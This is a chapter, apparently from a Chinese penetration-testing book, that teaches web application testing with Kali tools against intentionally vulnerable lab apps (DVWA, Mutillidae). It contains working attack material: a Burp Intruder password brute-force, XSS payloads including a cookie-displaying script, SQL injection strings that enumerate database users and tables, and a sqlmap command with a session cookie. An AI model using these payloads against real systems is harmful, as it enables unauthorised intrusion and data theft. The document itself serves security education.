# 第十章：Web 应用程序测试

在第六章中，*漏洞扫描*，我们看了使用 Nessus 和 OpenVAS 进行漏洞扫描，这两个都是非常强大的工具。在本章中，我们将专门研究用于 Web 和 Web 应用程序扫描和攻击的工具。

如今开发的大多数应用程序集成了不同的 Web 技术。这增加了暴露敏感数据的复杂性和风险。Web 应用程序一直是恶意对手窃取、操纵、破坏和勒索企业业务的长期目标。Web 应用程序的大量增加给渗透测试人员带来了巨大的挑战。关键在于保护 Web 应用程序的前端，其后端通常包括数据库、任何额外的微服务和整体网络安全。这是必要的，因为 Web 应用程序充当数据处理系统，数据库负责存储敏感数据（例如信用卡、客户详细信息和身份验证数据）。

本章将介绍的工具包括 Web 应用程序侦察和漏洞扫描程序、代理、数据库攻击类型、Web 攻击工具以及一些客户端/浏览器攻击工具。

# 技术要求

本章需要以下内容：

+   Kali Linux

+   **OWASP Broken Web Applications** (**BWA**)

OWASP BWA 是来自 OWASP 的预配置虚拟机，其中包含一些易受攻击的 Web 应用程序。我们将使用 VM 上的一个应用程序，即**Damn Vulnerable Web App** (**DVWA**)。

# Web 分析

在本节中，我们将介绍用于识别 Web 应用程序可能漏洞的工具。其中一些工具，特别是 Burp Suite 和 OWASP ZAP，不仅可以对 Web 和云应用程序执行漏洞评估，还可以攻击这些漏洞，并且您将在本章后面看到它们的出现。

根据我们从各种工具的结果中收集的信息，我们将能够确定我们的攻击向量，试图通过密码攻击或从数据库或系统本身中窃取数据来访问系统。

# Nikto

Nikto 是一个基本的 Web 服务器安全扫描程序。它扫描并检测 Web 应用程序上通常由服务器配置错误、默认和不安全文件以及过时的服务器应用程序引起的漏洞。由于 Nikto 纯粹基于 LibWhisker2 构建，因此它支持跨平台部署、SSL、主机身份验证方法（NTLM/基本）、代理和几种 IDS 逃避技术。它还支持子域枚举、应用程序安全检查（XSS、SQL 注入等），并且能够使用基于字典的密码攻击来猜测授权凭据。

要使用`nikto`，您可以转到应用程序菜单| 03-Web 应用程序分析| Web 漏洞扫描程序| nikto，或者在终端中简单地输入以下内容：

```
# nikto
```

要找到 Nikto，可以轻松地转到应用程序|漏洞分析|nikto。

默认情况下，就像之前在其他应用程序中看到的那样，只需运行命令即可显示我们可用的不同选项。要扫描目标，请输入`nikto -h <target> -p <port>`，其中`<target>`是目标网站的域名或 IP 地址，`<port>`是服务运行的端口。对于这次扫描，`nikto`将针对一个名为 OSWAP BWA 的本地 VM 进行扫描（可在[`sourceforge.net/projects/owaspbwa/files/`](https://sourceforge.net/projects/owaspbwa/files/)找到）。OWASP BWA 是一个基于 VMware 的虚拟机中的故意易受攻击的 Web 应用程序集合：

![](img/4401d8d5-6695-46f9-b4bd-56b535d2d504.jpg)

在屏幕截图中阅读结果片段时，在前几行中，`nikto`告诉我们目标的 IP 地址和主机名。在基本目标信息之后，`nikto`显示了正在运行的 Web 服务器及其版本，例如 Ubuntu 系统上的 Apache 2.2.14，并加载了一些模块，例如`mod_perl/2.0.4`和`OpenSSL/0.9.8k`。继续向下看，我们看到了一些有用的信息，例如 CGI 文件夹的路径(`/cgi-bin/`)，以及一些加载的模块已经过时：

![](img/98aa5ffd-fddf-460b-b1a9-4159f36b5e47.jpg)

在结果的更下方，`nikto`显示了 OSVDB 代码。OSVDB 是开放式漏洞数据库的缩写。这是安全行业专业人士于 2004 年正式启动的一个倡议，是一个存储安全漏洞的技术信息的数据库（其中绝大多数是与 Web 应用程序相关的）。不幸的是，由于缺乏支持和贡献，该服务于 2016 年 4 月关闭，但是，[`cve.mitre.org`](http://cve.mitre.org)团队已经编制了一个参考地图，将 OSVDB 与 CVE 条目联系起来（[`cve.mitre.org/data/refs/refmap/source-OSVDB.html`](http://cve.mitre.org/data/refs/refmap/source-OSVDB.html)）。

这可以用来获取`nikto`提供的 OSVDB 代码的更多详细信息：

![](img/87281aa4-a850-4ff6-8a16-938ce0c7320c.jpg)

Nikto 具有识别 Web 应用程序漏洞的功能，例如信息泄露、注入（XSS/Script/HTML）、远程文件检索（服务器范围内）、命令执行和软件识别。除了基本扫描外，Nikto 允许渗透测试人员定制其特定目标的扫描。以下是一些可用于扫描的选项：

+   使用`-T`命令行开关和单独的测试编号，可以将测试定制为特定类型

+   通过使用`–t`，您可以为每个测试响应设置超时值

+   `-D V`控制显示输出

+   `-o`和`-F`定义了要以特定格式编写的扫描报告

+   还有其他高级选项，例如`–mutate`（猜测子域、文件、目录和用户名）、`-evasion`（绕过 IDS 过滤器）和`-Single`（用于单个测试模式），您可以使用这些选项深入评估您的目标

# OWASP ZAP

**OWASP Zed Attack Proxy**（**ZAP**）是一个 Web 应用程序漏洞扫描器。由 OWASP 项目创建，这是一个基于 Java 的开源扫描器，具有很多功能。它包括 Web 爬虫、漏洞识别和模糊分析，并且可以作为 Web 代理。要启动 ZAP，转到应用程序|Web 应用程序分析|owasp-zap，或在终端中输入：

```
# owasp-zap
```

![](img/71e97514-84d9-4bcf-94c0-aed7c744a4f0.jpg)

加载后，很容易开始扫描目标站点。在 ZAP 的主屏幕上，有一个字段用于输入目标的地址。这次，目标是 BWA 虚拟机上易受攻击的 Web 应用程序之一，DVWA。输入目标后，单击“Attack”按钮，观察 ZAP 的工作：

![](img/313b3bfa-343c-4254-9121-6ccdfdb10b43.jpg)

扫描结果出现在主屏幕底部。ZAP 扫描站点时的第一步是识别或爬行整个站点，跟随与主机相关的链接：

![](img/894b06db-1646-4a85-8ee5-85681d03bbe1.jpg)

在爬行网站之后，ZAP 对常见的 Web 应用程序漏洞进行了多种不同的检查。这些漏洞在左下角的警报选项卡下显示。例如，以下是 ZAP 在 DVWA 应用程序上识别的漏洞：

![](img/ff9e27d1-3cb4-4a63-a676-ce663c9497c6.jpg)

然后，您可以深入研究特定站点路径，以确定这些漏洞确切出现的位置；在这种情况下，我们看到`login.php`容易受到 SQL 注入的攻击：

![](img/b82cf09a-af57-475c-ae2a-e0ade2de65f1.jpg)

扫描只是 ZAP 提供的所有工具的表面。有关 ZAP 的更多信息，OWASP 的资源位于[`www.owasp.org/index.php/ZAP`](https://www.owasp.org/index.php/ZAP)。

# Burp Suite

Burp Suite 是强大的 Web 应用程序安全工具的组合。这些工具展示了攻击者渗透 Web 应用程序的真实能力。它们可以使用手动和自动技术扫描、分析和利用 Web 应用程序。这些工具之间的接口集成设施提供了一个完整的攻击平台，可以在一个或多个工具之间共享信息。这使得 Burp Suite 成为一个非常有效和易于使用的 Web 应用程序攻击框架。

要启动 Burp Suite，请导航到应用程序|Web 应用程序分析|burpsuite 或使用终端执行以下命令：

```
# burpsuite
```

当首次启动 Burp 时，您将被要求接受条款和条件，并设置您的项目环境（现在保持默认设置就足够了）：

![](img/deadaeb5-fd90-4dc5-89bb-039702b87c09.jpg)

您将在屏幕上看到一个 Burp Suite 窗口。所有集成工具（目标、代理、蜘蛛、扫描器、入侵者、重复者、顺序器、解码器和比较器）都可以通过它们各自的选项卡访问。您可以通过帮助菜单或访问[`www.portswigger.net/burp/help/`](http://www.portswigger.net/burp/help/)获取有关它们的使用和配置的更多详细信息。请注意，Burp Suite 有三个不同的版本：**免费（社区）**、专业版和企业版。Kali 中提供的是免费社区版。

如前所述，Burp Suite 自带其自己的 Spider。应用程序感知蜘蛛，或 burpspider，是一个网络爬虫，本质上是一个系统地浏览目标站点及其所有内部页面并映射其结构的机器人。

在我们的示例中，我们将使用 Burp 来破解登录凭据以访问 DVWA 应用程序。首先，我们需要设置代理，并验证 IP 是否设置为本地主机 IP，端口应为`8080`。转到代理选项卡，然后转到选项子选项卡：

![](img/500cfbaf-39f8-4531-b1fc-429fc5fdae33.jpg)

还要验证代理选项在代理选项卡下是否打开，然后检查是否打开拦截选项卡：

![](img/78a997ee-8fc4-4016-964d-ab11dfc64b0d.jpg)

完成后，打开浏览器，转到选项|首选项|高级|网络|连接设置。

现在，您需要将浏览器设置为代理：

![](img/fb5bfd99-ef09-473d-98b9-5659485d304e.jpg)

这就是我们的初始设置。现在，我们需要访问目标站点，即`192.168.0.32/dvwa`：

![](img/baed0a38-4877-4f90-ab62-fe196228c75c.jpg)

输入地址后，它应该保持在连接循环中。但是，如果您查看 Burp Suite 界面，您可以看到一些数据：

![](img/57d34d84-fafe-40d5-be39-4428f087ac79.jpg)

点击几次“前进”后，浏览器应该加载到网页。

在 Burp Suite 中，在目标选项卡下，现在在站点地图选项卡中有一些数据：

![](img/ffe3b02e-aa62-42dd-8b87-d02c6371503d.jpg)

然后，只需右键单击主机并选择从此处蜘蛛或从主机蜘蛛。

现在，在某个地方，您应该会收到一个弹出窗口，指示 burpspider 发现了一个请求一些信息的表单。当 burpspider 发现表单时，它总是会弹出。请记住，表单可以请求用户凭据，也可以是一个简单的搜索/查询/查找表单。

说到这一点，在我们的情况下，这是一个登录表单：

![](img/a0bb27ac-f263-4dcc-946c-07d7ba2d49a1.jpg)

回到目标站点上的页面，通过在页面上的登录表单中输入一些随机凭据，为 Burp Suite 的入侵者工具生成一些流量。

输入凭据后，查看我们的拦截器：

![](img/a6502260-533e-414e-a79e-64c5eafd4fc9.jpg)

注意我们得到的关键信息，用户名和密码，并在网页上验证它如何告诉我们我们输入的凭据是错误的。在这种情况下，它告诉我们`登录`失败了，是一个简单的字符串消息，然而，有时可能会是一个弹出窗口或一个 cookie。

现在，右键单击目标，选择发送到 Intruder。

在 Intruder 选项卡下，选择 Positions 选项卡：

![](img/3ff47182-3ac5-4e01-b239-acc188de7372.jpg)

用户名和密码是我们输入的用户名和密码。请注意，默认情况下，可能会突出显示更多字段或位置。要清除这些字段，只需单击我们不想要的字段，然后单击右侧的清除按钮。这些字段或位置是 Intruder 将用我们定义的负载替换的地方，本例中是用户名和密码。

在继续之前，请验证攻击类型是否设置为 Cluster bomb。现在，转到 Payloads 选项卡：

![](img/e6077949-ce94-45ef-9d32-fb0966c9eac5.jpg)

当您点击负载集下拉菜单时，其中的计数应反映在位置选项卡中的位置数。

现在，选择 1，这将对应用户名字段，并将负载类型设置为 Simple list。在 Payload Sets 部分的 Payload Options 部分中，输入用户名在标有“输入新项目”的文本字段中，然后点击添加。这将被 Intruder 用作用户名。您可以添加多个用户名。

目前，我只会输入`admin`用户名进行测试：

![](img/736cd79a-37b5-4466-8eb4-74c662418ba4.jpg)

现在，让我们设置负载集 2，即密码字段。不要逐个输入密码，点击加载按钮，加载你的密码文件之一（`rockyou.txt`位于 Kali 的`/usr/share/wordlist`中）：

![](img/16ce6bca-de95-4800-a252-50fc65fef984.jpg)

一切设置好后，点击开始攻击：

![](img/d3de747d-c506-46fb-8876-c5dd852c0029.jpg)

这个截图显示了结果弹出窗口。查看结果，所有尝试都得到了`302`的状态（HTTP 响应代码）。快速搜索 HTTP 响应代码表明这会导致重定向，但重定向到哪里呢？

如果我们点击每个结果，然后选择响应选项卡，你会看到唯一重定向到`index.php`的结果是`admin:password`。现在我们可以转到 DVWA 登录页面，输入凭据，获得对该站点的访问权限。

我们还可以通过 Burp Suite 中的另一个工具 Repeater 来验证这一点。Repeater 用于手动修改 HTTP 请求和请求中发送的数据。

回到目标选项卡，选择`login.php`的`POST`请求。这是发送用户名和密码的表单请求。右键单击它，选择发送到 Repeater。

现在，选择 Repeater 选项卡：

![](img/8909c91a-5ac7-4917-868f-453a9b07042e.jpg)

在`password=`之后，删除错误的密码，输入将我们重定向到`index.php`的密码。在这种情况下，密码是`password`。完成后，点击 Go：

![](img/c08a5aa8-f955-4454-aeae-020e3c90b1e8.jpg)

在响应面板中，我们看到 Location:`index.php`。现在，点击顶部的`跟随重定向`按钮。这会产生原始 HTML，以及在渲染选项卡下的渲染，显示页面应该是什么样子的：

![](img/0c221a0c-1994-42de-83b5-f892d27729de.jpg)

在这个例子中，我们使用了 Burp Suite 提供的一些常用工具。作为一款集成了所有功能的应用安全工具包，Burp Suite 是一个非常全面和强大的 Web 应用程序攻击平台。

解释每个部分超出了本书的范围；因此，我们强烈建议您访问该网站（[`www.portswigger.net`](http://www.portswigger.net)）以获取更详细的示例。

# Paros 代理

Paros 代理是一个有价值且强大的漏洞评估工具。它可以爬行整个网站并执行各种漏洞测试。它还允许审计员通过在浏览器和实际目标应用程序之间设置本地代理来拦截 Web 流量（HTTP/HTTPS）。这种机制帮助审计员干扰或操纵发送到目标应用程序的特定请求，以便手动测试。因此，Paros 代理充当主动和被动的 Web 应用程序安全评估工具。要启动 Paros 代理，请导航到应用程序 | Web 应用程序分析 | paros 或在终端中输入以下命令：

```
# paros
```

这将打开 Paros 代理窗口。在进行任何实际练习之前，您需要在您喜欢的浏览器中设置本地代理（`127.0.0.1, 8080`）。如果您需要更改任何默认设置，请导航到菜单栏中的工具 | 选项。这将允许您修改连接设置、本地代理值、HTTP 身份验证和其他相关信息。设置好您的浏览器后，访问您的目标网站。

以下是漏洞测试和获取其报告的步骤：

1.  在我们的案例中，我们浏览`http://192.168.0.30/mutillidae`并注意到它出现在 Paros 代理的站点选项卡下。

1.  右键单击`http://192.168.0.30/mutillidae`并选择 Spider 以爬行整个网站。这将需要几分钟，具体取决于您的网站大小。

1.  网站爬行完成后，您可以在底部的 Spider 选项卡中看到所有发现的页面。此外，您可以通过在站点选项卡的左侧面板上选择目标网站，并选择特定页面来追踪所需页面的特定请求和响应。

1.  为了捕获任何进一步的请求和响应，请转到右侧面板上的 Trap 选项卡。当您决定对目标应用程序进行一些手动测试时，这是特别有用的。此外，您可以通过导航到工具 | 手动请求编辑器来构建自己的 HTTP 请求。

1.  要执行自动化的漏洞测试，我们在站点选项卡下选择目标网站，并导航到分析 | 从菜单中的所有扫描。请注意，您仍然可以通过导航到分析 | 扫描策略，然后导航到分析 | 扫描而不是扫描所有来选择特定类型的安全测试。

1.  漏洞测试完成后，您可以在底部的警报选项卡上看到一些安全警报。这些被分类为高、低和中风险级别。

1.  如果您想要扫描报告，请在菜单栏中导航到报告 | 最新扫描报告。这将生成一个报告，列出测试会话期间发现的所有漏洞(`/root/paros/session/LatestScannedReport.html`)。

![](img/edc4ac8f-5744-4a3c-8e2d-9de0529c6379.png)

我们使用了基本的漏洞评估测试来进行示例场景。

为了更熟悉 Paros 代理提供的各种选项，我们建议您阅读用户指南，网址为：[`www.ipi.com/Training/SecTesting/paros_user_guide.pdf`](http://www.ipi.com/Training/SecTesting/paros_user_guide.pdf)。

# W3AF

W3AF 是一个功能丰富的 Web 应用程序攻击和审计框架，旨在检测和利用 Web 漏洞。整个应用程序安全评估过程是自动化的，该框架旨在遵循三个主要步骤：发现、审计和攻击。每个步骤都包括几个插件，可以帮助审计员专注于特定的测试标准。所有这些插件都可以通信并共享测试数据，以实现所需的目标。它支持检测和利用多个 Web 应用程序漏洞，包括 SQL 注入、跨站脚本、远程和本地文件包含、缓冲区溢出、XPath 注入、操作系统命令和应用程序配置错误。

要获取有关每个可用插件的更多信息，请转到[`w3af.sourceforge.net/plugin-descriptions.php`](http://w3af.sourceforge.net/plugin-descriptions.php)。

要启动 W3AF，请转到应用程序 | Web 漏洞分析 | w3af，或者在终端中输入以下内容：

```
# w3af_console
```

这将使您进入个性化的 W3AF 控制台模式（`w3af>>>`）。请注意，该工具的 GUI 版本也可在相同菜单的位置找到，但我们选择向您介绍控制台版本，因为它具有灵活性和可定制性：

```
w3af>>> help
```

这将显示可用于配置测试的所有基本选项。每当您需要任何特定选项的帮助时，都可以使用帮助命令。在我们的练习中，我们将配置输出插件，启用所选的审计测试，设置目标，并对目标网站执行扫描过程，使用以下命令：

+   `w3af>>> 插件`

+   `w3af/plugins>>> 帮助`

+   `w3af/plugins>>> 输出`

+   `w3af/plugins>>> 输出控制台，html 文件`

+   `w3af/plugins>>> 输出配置 html 文件`

+   `w3af/plugins/output/config:html_file>>> 帮助`

+   `w3af/plugins/output/config:html_file>>> 查看`

+   `w3af/plugins/output/config:html_file>>> 设置详细 True`

+   `w3af/plugins/output/config:html_file>>> 设置输出文件 metasploitable.html`

+   `w3af/plugins/output/config:html_file>>> 返回`

+   `w3af/plugins>>> 输出配置控制台`

+   `w3af/plugins/output/config:console>>> 帮助`

+   `w3af/plugins/output/config:console>>> 查看`

+   `w3af/plugins/output/config:console>>> 设置详细 False`

+   `w3af/plugins/output/config:console>>> 返回`

+   `w3af/plugins>>> 审计`

+   `w3af/plugins>>> 审计 htaccess_methods, os_commanding, sqli, xss`

+   `w3af/plugins>>> 返回`

+   `w3af>>> 目标`

+   `w3af/config:target>>> 帮助`

+   `w3af/config:target>>> 查看`

+   `w3af/config:target>>> 设置目标 http://http://192.168.0.30/mutillidae/index.php?page=login.php`

+   `w3af/config:target>>> 返回`

+   `w3af>>>`

此时，我们已经配置了所有必需的测试参数。我们将使用以下命令对目标进行 SQL 注入、跨站脚本、OS 命令执行和 htaccess 配置错误进行评估：

```
w3af>>> start
```

![](img/5c207d32-7caa-41bc-aac2-8b89828588e3.png)

正如您所看到的，我们已经发现了目标 Web 应用程序中的跨站脚本漏洞。还创建了一个详细的 HTML 报告，并发送到`root`文件夹。该报告详细说明了所有的漏洞，包括关于每个请求和 W3AF 与目标 Web 应用程序之间传输的响应数据的调试信息。

我们在前面的代码中呈现的测试案例并未反映出其他有用插件、配置文件和利用选项的使用。因此，我们强烈建议您浏览用户指南中提供的各种练习。这些可以在[`w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf`](http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf)找到。

# WebScarab

WebScarab 是一个强大的 Web 应用程序安全评估工具。它有几种操作模式，但主要通过拦截代理进行操作。该代理位于最终用户的浏览器和目标 Web 应用程序之间，以监视和修改在两侧传输的请求和响应。这个过程帮助审计人员手动制作恶意请求并观察 Web 应用程序返回的响应。它具有许多集成工具，如模糊器、会话 ID 分析、蜘蛛、Web 服务分析器、XSS 和 CRLF 漏洞扫描器以及转码器。

要启动 WebScarab lite，请转到应用程序 | Web 应用程序分析 | webscarab，或者在终端中输入以下内容：

```
# webscarab
```

这将弹出 WebScarab 的精简版。对于我们的练习，我们将通过导航到菜单栏中的 Tools | Use full-featured interface 来将其转换为完整功能版。这将确认选择，并且你应该相应地重新启动应用程序。一旦你重新启动 WebScarab 应用程序，你将在屏幕上看到一些工具选项卡。在开始练习之前，我们需要将浏览器配置到本地代理（`127.0.0.1, 8008`），以便通过 WebScarab 拦截代理浏览目标应用程序。如果你想更改本地代理（IP 地址或端口），请导航到 Proxy | Listeners 选项卡。以下步骤将帮助你分析目标应用程序的会话 ID：

+   一旦本地代理设置好，你应该浏览到目标网站（例如，`http://192.168.0.30/mutillidae`），并访问尽可能多的链接。这将增加捕获任何已知和未知漏洞的概率。或者，你可以在摘要选项卡下选择目标，右键单击，然后选择 Spider tree。这将获取目标应用程序中的所有可用链接。

+   如果你想检查摘要选项卡底部提到的特定页面的请求和响应数据，双击它，你可以看到表格和原始格式中的解析请求。然而，响应也可以以 HTML、XML、文本和十六进制格式查看。

+   在测试期间，我们可能决定对我们的目标应用程序链接之一进行模糊处理，该链接具有参数（例如，`artist=1`），使用`GET`方法。如果存在未知的漏洞，这可能会揭示出来。右键单击所选链接，选择“Use as fuzz template”。现在，单击 Fuzzer 选项卡，并通过单击 Parameters 部分附近的 Add 按钮手动应用不同的值到参数。在我们的情况下，我们编写了一个列出已知 SQL 注入数据的小文本文件（例如，`1 AND 1=2`，`1 AND 1=1`，和单引号`(')`），并将其作为模糊参数值的来源。这可以通过 Fuzzer 选项卡下的 Sources 按钮来完成。一旦你的模糊数据准备好了，点击开始。在所有测试完成后，你可以双击单个请求并检查其响应。在我们的一个测试案例中，我们发现了一个 MySQL 注入漏洞：

+   **错误**：你的 SQL 语法有错误；请检查与你的 MySQL 服务器版本相对应的手册，以了解在第`1`行附近使用的正确语法。

+   **警告**：`mysql_fetch_array()`: supplied argument is not a valid MySQL result resource in `/var/www/vhosts/default/htdocs/ listproducts.php` on line `74`

+   在我们的最后一个测试案例中，我们决定分析目标应用程序的会话 ID。为此，请转到`SessionID`分析选项卡，并从组合框中选择“Previous Requests”。一旦选择的请求加载完成，转到底部，选择样本（例如，`20`），然后单击 Fetch 以检索各种会话 ID 的样本。之后，单击“测试”按钮开始分析过程。你可以在分析选项卡上看到结果，并在可视化选项卡上看到图形表示。这个过程确定了会话 ID 的随机性和不可预测性，这可能导致劫持其他用户的会话或凭据。

这个工具有各种选项和功能，可能会为渗透测试增加认知价值。要获取有关 WebScarab 项目的更多信息，请访问[`www.owasp.org/index.php/Category:OWASP_WebScarab_Project`](http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project)。

# 跨站脚本

**跨站脚本**（**XSS**）攻击今天仍然非常普遍。这是一种注入攻击类型，攻击者向 Web 应用程序发送的请求中注入恶意脚本或代码。这些攻击成功是因为用户输入在发送到服务器之前没有得到正确的验证。

最初有两种 XSS，但在 2005 年，发现了第三种：

+   **存储 XSS：**存储 XSS 发生在用户输入被存储在目标服务器上并且没有被验证的情况下。存储可以是数据库、论坛或评论字段。受害者在不知情的情况下从 Web 应用程序中检索存储的数据，因为浏览器认为由于客户端和服务器之间的固有信任，这些数据是安全的。由于输入实际上被存储，存储 XSS 被认为是持久性或永久性的。

+   **反射 XSS：**反射 XSS 发生在用户输入立即由 Web 应用程序返回，以错误消息、搜索结果或任何其他响应的形式返回，其中包括用户提供的请求的一部分或全部输入，而这些数据在浏览器中没有被安全地呈现，并且没有永久存储用户提供的数据。

+   DOM XSS：**文档对象模型**（**DOM**）是 HTML 和 XML 文档的编程 API。它定义了文档的逻辑结构以及文档的访问和操作方式。DOM 型 XSS 是一种 XSS 形式，其中从源到汇的整个污染数据流都在浏览器中进行，也就是说，数据的源在 DOM 中，汇也在 DOM 中，数据流永远不会离开浏览器。

# 测试 XSS

为了测试 XSS 漏洞，我们将使用 JavaScript 和标准 HTML：

+   **测试反射 XSS**

记住我们之前说过的：反射 XSS 之所以被命名，是因为用户输入立即被 Web 应用程序处理并返回。要测试它，我们需要找到一个接受用户输入的字段。

让我们登录到之前破解密码的 DVWA 页面。在主页上，左侧将有一个菜单：

![](img/ad32e445-d743-411b-a2b3-96b8e3dec20f.jpg)

选择 DVWA 安全，然后在下拉框中选择低，然后单击提交。通过这样做，我们已经设置了 Web 应用程序，使其操作就好像输入没有被验证一样：

![](img/88e197b2-2f66-48e2-b358-e395caf986e4.jpg)

对于我们的第一个测试，导航到页面上反射 XSS 显示在左侧菜单中。在输入字段中，输入以下 JavaScript：

```
<script>alert(“Allows XSS”)</script>
```

![](img/a46d1be3-8682-4f93-8c01-43272eaef9ec.jpg)

单击提交。

如果成功，您应该看到一个带有“允许 XSS”消息的弹出消息框：

![](img/aa2300bf-9929-42bf-98fb-7538ad7fe838.jpg)

让我们再试一次。输入以下内容：

```
<script>window.location=’https://www.google.com’</script>
```

![](img/c27042ef-9252-49be-a00a-65ed7b3c4e94.jpg)

这将把浏览器重定向到不同的网站，在我们的例子中是[google.com](https://www.google.com/?gws_rd=ssl)。

+   **测试存储 XSS**

存储 XSS 之所以被命名，是因为它将自身存储在一个位置，尽管是数据库，并且每当用户访问受影响的站点时，代码都会执行。攻击者可以轻松地将关键信息，如 cookie，发送到远程位置。要测试它，我们需要找到一个接受用户输入的字段，例如评论字段。

让我们导航到左侧菜单中存储 XSS 的页面。我们看到两个输入字段：名称和消息。这模拟了许多网站上找到的基本评论或反馈表单。在名称字段中，输入任何您喜欢的名称，但在消息字段中输入以下代码，然后单击“签名留言簿”：

```
<script>alert(document.cookie)</script>
```

![](img/bf3fa090-98cd-494c-ad9c-b1f933ea6971.jpg)

这是我们得到的弹出窗口：

![](img/aa79f930-1705-4457-9a63-ba75275b73f1.jpg)

现在，如果我们离开这个页面，比如到主页，然后返回到 XSS 存储页面，我们的代码应该再次运行并显示一个带有当前会话 cookie 的弹出窗口。这可以大大扩展，并且通过更多 JavaScript 的了解，攻击者可以造成很大的破坏。

# SQL 注入

SQL 注入，或 SQLi，是对 SQL 数据库的攻击，其中通过来自客户端到应用程序的某种输入插入了代码或数据库查询。SQLi 是最古老的漏洞之一，但仍然是最常见的漏洞之一，因为基于 SQL 的数据库是如此普遍，所以也是最危险的漏洞之一。

SQL 注入攻击的严重程度受到攻击者的技能和想象力的限制，以及防御深度对策的影响，例如对数据库服务器的低特权连接。一般来说，将 SQL 注入视为高影响严重性。

在我们注入 SQL 之前，我们应该对 SQL 有一个基本的了解，并且了解数据库结构。

SQL 被认为是第四代编程语言，因为它使用标准的人类可理解的单词作为其语法：只是英语和括号。 SQL 用于数据库，我们可以使用它来创建表；添加记录，删除和更新，为用户设置权限；等等。

这是一个创建表的基本查询：

```
create table employee 
(first varchar(15),
last varchar(20),
age number(3),
address varchar(30),
city varchar(20),
state varchar(20));
```

前面的代码表示创建一个名为`employee`的表，具有以下列，`first`，`last`，`age`，`address`和`city`，然后分配它们的数据类型为`varchar(15)`字符限制[可变字符，最多 15 个字符]，和 number(3) [仅数字，最多 3 个数字，因此为 999]。

这是一个基本查询（也称为`select`语句）来从表中检索数据：

```
select first, last, city from employee
```

`select`语句是我们将利用的查询。

当您登录网站时，它会向数据库发送一个选择查询/语句，以检索数据以确认您登录的数据。

假设登录页面如下所示：

![](img/0ea426a2-6048-413d-a465-163d3eec76ac.jpg)

在登录时的后端查询可能如下所示：

```
SELECT * from users WHERE username=’username’ and password=’password’
```

前面的语句表示从名为 users 的表中选择所有（`*`），其中列`username=`是变量用户名（登录字段），列`password =`是变量密码（密码字段）。

# 手动 SQL 注入

现在我们了解了 SQL 查询的基础知识，让我们利用这一点。再次使用 DVWA，登录到 DVWA 并转到 SQL 注入：

![](img/14c10021-743c-416a-bf0b-4300034cf931.jpg)

我们可以看到这个页面有一个字段，供用户输入某人的用户 ID。如果我们在这里输入`1`，应用程序应该告诉我们谁有用户 ID 1。

让我们对 SQL 注入进行一个简单的测试。在用户 ID 字段中，不要输入数字，输入以下内容：

`%’ or ‘1’=’1`：

![](img/b219451f-4172-4fee-adcf-67a087ce569a.jpg)

让我们假设初始查询如下所示：

```
SELECT user_id, first_name, fast_name From users_table Where user_id = 'UserID';
```

我们假设表名为`users_table`，具有相关的列名。我们所做的是将前面的语句更改为以下内容：

```
'SELECT user_id, first_name, last_name FROM users WHERE user_id = %' OR '1'='1';
```

然后点击提交。我们的结果应该是表中的所有数据，如下所示：

![](img/207d7906-063a-4a70-a8b1-b9d6337e13f8.jpg)

`%`表示 mod 并将返回`false`。但我们添加了 OR 运算符。因此，由于查询的第一部分将返回`false`（因为`%`），OR 将强制其执行第二部分，`'1'='1`，这是`true`。因此，因为查询运行的一切，对于表中的每条记录来说，它总是`true`，SQL 打印出表中的所有记录。

以下是您可以尝试的其他查询：

+   获取用于在 Web 应用程序和数据库之间连接的帐户的用户名：`%' or 0=0 union select null, user() #`

+   从中获取我们一直在提取数据的当前数据库：`%' or 0=0 union select null, database() #`

+   显示信息模式表：`information_schema`表是一个存储有关所有其他数据库的信息的数据库；`%' and 1=0 union select null, table_name from information_schema.tables #`

+   显示数据库表：使用上一个查询的数据，我们可以找出表是什么：`%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#`

# 自动化 SQL 注入

现在我们了解了 SQL 注入的外观，让我们看一些可以自动化此过程的工具。

# sqlmap

sqlmap 是 Kali 内置的工具，可用于识别和利用 SQLi 漏洞。在这个例子中，我们将使用 Burp Suite 收集一些数据，然后将其提供给`sqlmap`进行工作。

启动 Burp Suite 并设置浏览器通过其代理路由所有流量。确保拦截是打开的。转到 DVWA 应用程序上的 SQL 注入页面并输入用户 ID；在这种情况下，我将输入`1`。

Burp 会捕获请求。将其转发直到请求完成。您应该在网页上看到您的结果。转到目标选项卡，选择 DVWA IP（在我的情况下是`192.168.0.19`），并使用箭头向下浏览结果，按照 URL 路径，`http://192.168.0.19/dvwa/vulnerabilities/sqli/`（您可以在浏览器的地址栏中确认）：

![](img/0ec95d23-9cdb-47f4-8baa-e4461a05bc4f.jpg)

选择状态为`200`（HTML 代码为`200`）的请求：

![](img/762ccbec-2e12-4090-ab03-6e4ac68f9677.jpg)

在请求选项卡中，我们得到了我们需要的信息-Web 应用程序发送的实际请求（引用者），它在第一行中：`/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit`，以及我们得到的 PHP 会话 ID 或 Cookie：

![](img/924facf8-48fe-429e-bb1e-7b6d6412c9d4.jpg)

有了这些数据，让我们打开终端并输入以下内容来获取数据库用户，就像我们用手动步骤一样：

```
sqlmap -u "http://192.168.0.19/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=fb89mhevcus9oq1a1f2s6q3ss4; security=low" -b --current-db --current-user
```

这是一行没有断点的`--cookie`：

![](img/4e54b488-4dda-4eee-b4de-1fda3b1bfddc.jpg)

+   `-u`：用于从 Burp 获取的目标 URL

+   `--cookie`：用于从 Burp 捕获的 cookie 信息

+   `-b`：显示数据库横幅

+   `--current-db`：获取当前数据库

+   `--current-user`：获取当前数据库的当前用户：

![](img/3e6e8774-b7cb-4834-90c3-9e9a9d215982.jpg)

在测试过程中会提示您，您可以安全地按下*Enter*键接受默认设置。只有一个提示，我没有使用默认设置，纯粹是为了节省时间：

![](img/86a8851c-f0ba-4c31-91fc-2e219323a931.jpg)

最后，我们得到了结果：

![](img/888d2a28-948f-4e74-9f54-d295f46cb8b6.jpg)

我们得到了有关运行数据库的操作系统（`Ubuntu 10.04`），服务器端技术（`PHP 5.3.2 和 Apache 2.2.14`），数据库（`MySQL`），当前数据库（`dvwa`）和当前用户（`dvwa`）的信息。

要获取`sqlmap`提供给您的所有选项的列表，只需在终端中键入`sqlmap -h`，如果您想要更高级的选项，输入`sqlmap --hh`。

# 命令执行，目录遍历和文件包含

